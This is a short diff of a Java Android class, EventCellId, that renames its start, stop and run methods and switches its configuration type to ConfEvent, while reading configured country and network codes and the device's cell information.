@@ -14,6 +14,7 @@ import java.io.IOException;
 import com.android.service.CellInfo;
 import com.android.service.Device;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -34,16 +35,16 @@ public class EventCellId extends BaseEvent {
 	boolean entered = false;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		entered = false;
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 	}
 
 	@Override
-	public boolean parse(EventConf conf) {
+	public boolean parse(ConfEvent conf) {
 		try {
 			mccOrig = conf.getInt("country");
 			mncOrig = conf.getInt("network");
@@ -65,7 +66,7 @@ public class EventCellId extends BaseEvent {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		final CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
 			if (Cfg.DEBUG) {
